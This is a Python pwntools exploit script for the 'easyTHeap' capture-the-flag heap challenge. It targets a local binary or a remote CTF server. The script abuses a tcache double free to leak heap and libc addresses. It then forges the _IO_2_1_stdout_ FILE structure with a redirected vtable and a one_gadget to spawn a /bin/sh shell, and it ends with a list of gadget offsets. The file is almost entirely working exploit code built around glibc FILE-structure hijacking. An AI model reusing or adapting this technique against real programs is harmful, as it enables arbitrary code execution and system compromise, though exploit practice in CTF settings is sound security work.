#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'vn_pwn_easyTHeap'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28200


LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def get_IO_str_jumps_offset():
	IO_file_jumps_offset = lib.sym['_IO_file_jumps']
	IO_str_underflow_offset = lib.sym['_IO_str_underflow']
	for ref_offset in lib.search(p64(IO_str_underflow_offset)):
		li('AA')
		possible_IO_str_jumps_offset = ref_offset - 0x20
		if possible_IO_str_jumps_offset > IO_file_jumps_offset:
			return possible_IO_str_jumps_offset

def ad(size):
	sla('choice: ', str(1))
	sla('?', str(size))

def rm(idx):
	sla('choice: ', str(4))
	sla('?', str(idx))

def md(idx, data):
	sla('choice: ', str(2))
	sla('?', str(idx))
	sla(':', data)

def dp(idx):
	sla('choice: ', str(3))
	sla('?', str(idx))

def q():
	sla('choice: ', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x100) #idx 0
	ad(0x100) #idx 1

	rm(0)
	rm(0)

	# leak heap addr
	dp(0)
	heap_base = u64(ru('\n') + '\x00\x00') - 0x260
	li('heap_base ' + hex(heap_base))

	ad(0x100) # 2 for ajust
	ad(0x100) # 3
	ad(0x100) # 4 teache count as -1, so free chunk will not be teache bin
	rm(0)

	# leak libc
	_IO_str_jumps_offset = get_IO_str_jumps_offset()

	dp(0)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 96 - 0x3ebc40
	li('libc base ' + hex(lib.address))

	_IO_str_jumps = lib.address + _IO_str_jumps_offset
	_IO_2_1_stdout_ = lib.sym['_IO_2_1_stdout_']

	li('_IO_str_jumps ' + hex(_IO_str_jumps))
	li('_IO_2_1_stdout ' + hex(_IO_2_1_stdout_))
	vtable_jump = _IO_str_jumps - 0x28
	gadget = [0x4f2c5, 0x4f322, 0x10a38c]
	one_gadget = lib.address + gadget[1]

	# can't malloc only to modify _IO_2_1_stdout vtable
	p = p64(_IO_2_1_stdout_) # evil address
	md(3, p)

	ad(0x100) # idx 5 for ajust
	ad(0x100) # idx 6, malloc to our addr

	p = p64(0xfbad2886)
	p += p64(_IO_2_1_stdout_ + 0x200) * 7
	p += p64(_IO_2_1_stdout_ + 0x201)
	p += p64(0) * 5
	p += p32(1) # file num
	p += p32(0)
	p += p64(0xffffffffffffffff)
	p += p64(0x000000000a000000)
	_IO_stdfile_1_lock = lib.address + (0x7ff3095508c0 - 0x7ff309163000)
	p += p64(_IO_stdfile_1_lock)
	p += p64(0xffffffffffffffff)
	p += p64(0)
	_IO_wide_data_1 = lib.address + (0x7f2fc336a8c0 - 0x7f2fc2f7f000)
	p += p64(_IO_wide_data_1)
	p += p64(0) * 3
	p += p64(0xffffffff)
	p = p.ljust(0xd8, '\x00')
	p += p64(vtable_jump)
	p += p64(0)
	p += p64(one_gadget)

	
	db()
	md(6, p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
